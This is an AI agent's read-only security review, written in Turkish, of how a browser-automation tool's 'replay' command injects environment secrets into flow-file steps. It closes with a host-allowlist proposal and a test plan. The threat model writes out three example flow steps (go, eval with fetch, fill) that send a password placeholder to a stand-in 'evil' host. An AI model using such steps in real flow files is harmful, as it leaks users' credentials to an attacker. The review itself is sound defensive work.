# replay ve CDPILOT_VAR_* — tehdit modeli ve öneri (10.11.2026)

> agy-filo şeridi `replay-var-2` (Opus 5.5, salt okunur). Şef özeti: `replay` ortam değerini her adımın her argümanına koyar; hazırlanmış bir akış dosyası değeri `go`/`eval`/`fill` ile başka hosta gönderebilir. 0.9.5'ten beri var; MCP'den erişim yok. Öneri (b): ortam değeri yalnız girdi komutunun değer konumuna, `CDPILOT_VAR_HOSTS` doluysa ve canlı host listedeyse.

Hiçbir dosyayı değiştirmedim, test de koşmadım. Bulgular yalnız hedefli grep ve kısa okumalara dayanıyor.

**(1) `replay` için tehdit modeli**
- **Dosyayı kim yazar:** Akış dosyası bir betik gibidir. Her adım `{cmd,args}` taşır ve [cdpilot.py:22687](src/cdpilot.py#L22687) `[python, cdpilot.py, cmd] + sub_args` komutunu koşar. Komut için izin listesi yoktur; [22579-22586](src/cdpilot.py#L22579-L22586) yalnız tipleri denetler. Yazanlar: `record stop --save` (0600), elle düzenleme, kabuğu olan bir ajan ve depoda paylaşılan ya da indirilen bir akış dosyası. Asıl gerçekçi tehdit sonuncusudur: kabuk profilinde `CDPILOT_VAR_PASSWORD` hep duran bir kullanıcı, depodan gelen bir akışı koşar.
- **MCP üzerinden erişim:** Yok. MCP araç tablosunda (18689-18990 arası) `replay`, `record` ya da `run` aracı bulunmuyor. `browser_agent_run`, `agent run` komutuna eşleniyor ([18986](src/cdpilot.py#L18986)).
- **Dolaylı yol:** `run <script.cdp>` her satırı alt süreç olarak koşar ([15209](src/cdpilot.py#L15209)), yani `replay` da çağırabilir. Bu yol da dosyaya dayanır.
- **Kabuklu ajan:** Kabuğu olan bir model `echo $CDPILOT_VAR_X` ile değeri zaten okuyabilir. Asıl yeni risk, böyle bir ajanın bıraktığı akışı sonra bir insanın koşmasıdır.
- **Ne yerine konur:** `{{name}}` biçimindeki yer tutucu, her adımın her argümanında değiştirilir ([22649-22654](src/cdpilot.py#L22649-L22654)). Buna `go` URL'si, `fill`/`type` değeri, `eval` kaynağı ve bayraklar dahildir. Değer kaynağı tüm `CDPILOT_VAR_*` ortam değişkenleridir ([22588-22595](src/cdpilot.py#L22588-L22595)); `--var` ile gelen değer önce gelir.
- **Kaydedilen adımda konum yok:** Adımda host ya da URL saklanmıyor, yalnız `cmd/args/t_ms/exit` var ([21909-21913](src/cdpilot.py#L21909-L21913)). Kaydedici gizli URL parametresini de `{{name}}` yapıyor (README:1121). Yani kayıtlı bir akışta `go` URL'sinde yer tutucu olması meşrudur.
- **Sızma mümkün mü:** Evet. Örnek üç yol:
  - `{"cmd":"go","args":["https://evil/?p={{password}}"]}`
  - `{"cmd":"eval","args":["fetch('https://evil/?'+'{{password}}')"]}` (`eval` → [23461](src/cdpilot.py#L23461))
  - önce `go https://evil`, sonra `fill #x {{password}}`

  Üçünde de değer saldırganın seçtiği hosta gider. Hiçbir host denetimi yok.
- **Ek not:** Yalnız başarısız adımın çıktısı temizlenir ([22702](src/cdpilot.py#L22702)). Başarılı bir `eval` değeri stdout'a yazabilir. Bu yerel ekrana gider, dışarı sızma sayılmaz.

**(2) Öneri: (b), yani daha zayıf bir kural**
- **Neden (a) olmaz:** `replay` adımı host saklamadığı için `agent run` kuralı birebir uygulanamaz. (c) de yetmez: belgeleme, depodan gelen akış riskini kapatmaz.
- **Kural:** `CDPILOT_VAR_<NAME>` değeri yalnız iki koşulda kullanılır:
  - adım `RECORD_INPUT_CMDS` içindedir ([21833](src/cdpilot.py#L21833)) ve yer tutucu değer konumundadır (seçici ya da bayrak değil);
  - `CDPILOT_VAR_HOSTS` boş değildir.

  `go`, `eval` ve diğer her komutta ortam değeri kullanılmaz; orada yalnız `--var` geçer. Bu kontrol `env_by_step` gibi, hiçbir adım koşmadan önce yapılır.
- **Canlı host denetimi:** Ortam değeri dolduran her adımdan hemen önce `cmd_replay` etkin sekmenin URL'sini okur. Host `_agent_host_allowed(host, _agent_env_var_hosts())` ile geçmezse adım çıkış kodu 2 ile reddedilir ([16363](src/cdpilot.py#L16363) kullanılır).
- **Değişecek yerler:**
  - [22588-22595](src/cdpilot.py#L22588-L22595): ortam değerleri ve CLI değerleri ayrı sözlüklerde tutulur.
  - `get_var_value` ([22604](src/cdpilot.py#L22604)) adım bağlamı alır.
  - [22613-22620](src/cdpilot.py#L22613-L22620): eksik değerlerin yanında `refused` listesi de yazılır; çıktı `agent run` hata JSON'u biçiminde olur.
  - [22646-22654](src/cdpilot.py#L22646-L22654): yerine koymadan önce canlı host denetimi yapılır.
  - İsteğe bağlı: [21909](src/cdpilot.py#L21909) adıma kayıt anındaki `host` alanını yazar. Bu, ileride (a) kuralına geçişi sağlar.
  - README:1121 ve yardım metninin 41-42. satırları güncellenir.
- **Kullanıcının göreceği değişiklik:** `CDPILOT_VAR_HOSTS` olmadan yalnız ortamla çalışan `replay` artık çıkış kodu 2 verir ve `refused` listesini basar. URL'deki gizli parametre yer tutucusu artık `--var` ister. `--var` ile gelen değerin davranışı değişmez.
- **Test planı** (test/test.js içindeki 11500-11700 arası sahte tarayıcı testleri kalıp olarak kullanılır):
  1. Ortam değeri `go` URL'sine konmaya çalışılınca çıkış 2, hiçbir adım koşmaz.
  2. Ortam değeri `eval` içine konmaya çalışılınca çıkış 2.
  3. `fill` ile ortam değeri, `CDPILOT_VAR_HOSTS` yokken çıkış 2.
  4. `CDPILOT_VAR_HOSTS` hostu adlandırıyor ama canlı host farklıysa adım reddedilir; değer stdout ya da stderr'de görünmez.
  5. Aynı akış `--var` ile verilince başarıyla çalışır.
  6. `--dry-run` değeri hiç basmaz.
  7. Mevcut `replay:` testleri yeşil kalır, gerekirse `--var` kullanacak biçimde uyarlanır.

**(3) `agent act` ve `url_before`**
- **Yapılan:** `url_before`, son gözlemden gelen `state['last_url']` ([16164](src/cdpilot.py#L16164)) olarak alınır. Eylem, eski haritadaki `backend_node_id` ile yapılır ([16117](src/cdpilot.py#L16117)).
- **Yanlış origin'e sabitleme:** Sayfa gözlemden sonra origin değiştirirse, eski belgenin düğüm kimliği büyük olasılıkla çözülmez ve eylem başarısız olur. Bu durumda iz yazılmaz. Yeni süreçte kimlik çakışması olabilir mi, bunu DOĞRULAMADIM. Aynı origin içindeki `pushState` origin'i değiştirmez.
- **Önemli mi:** Sızma açısından önemli değil. Sabitlenen origin her zaman kullanıcının gözlemlediği sayfadır. Replay ise canlı origin'i denetler ([16633](src/cdpilot.py#L16633) ve [16645-16652](src/cdpilot.py#L16645-L16652)) ve ortam değeri için `CDPILOT_VAR_HOSTS` adını ister. Yanlış sabitleme en kötü durumda drift üretir, değer başka hosta gitmez.
- **Kalan küçük risk:** Replay'de [16633](src/cdpilot.py#L16633) anlık görüntüsü ile [16654](src/cdpilot.py#L16654) eylemi arasında bir TOCTOU penceresi var. Çapraz origin gezinmesinde eski `backend_node_id` büyük olasılıkla çözülmez. Bunu canlı tarayıcıda test etmedim.

SONUÇ:
| Kalem | Durum |
|---|---|
| (1) Tehdit modeli | `replay`, ortam değerini her komuta ve her argümana koyuyor (cdpilot.py:22588-22654). Hazırlanmış bir akış dosyası değeri `go`/`eval`/`fill` ile saldırgan hostuna gönderebiliyor. MCP üzerinden erişim yok (18689-18990). |
| (2) Öneri | (b) seçeneği: ortam değeri yalnız girdi komutunun değerinde, `CDPILOT_VAR_HOSTS` dolu olduğunda ve canlı host bu listedeyse kullanılır. Değişecek yerler: 22588-22654 ve 21909. Yedi maddelik test planı var. |
| (3) `url_before` | Sızma riski yok. Replay canlı origin'i denetliyor (16645-16652). Yanlış sabitleme yalnız drift üretir. |

- Yalnız okudum: src/cdpilot.py, test/test.js (başlıklar), README.md (494-524, 1111-1121) ve MEMORY.md (eşleşme yok).
- Derleme ya da test YOK. Kod değişmediği için test-tutanak yok. Tarayıcıya bağlanmadım.
- Doğrulanmadı: çapraz süreçte `backend_node_id` çakışması ve gözlem → eylem arasındaki TOCTOU penceresi.
- DERS: `replay` akış dosyası, izin listesi olmayan bir komut betiğidir. Ortam değişkenindeki gizli değerler, adımda saklanan host olmadan korunamaz.
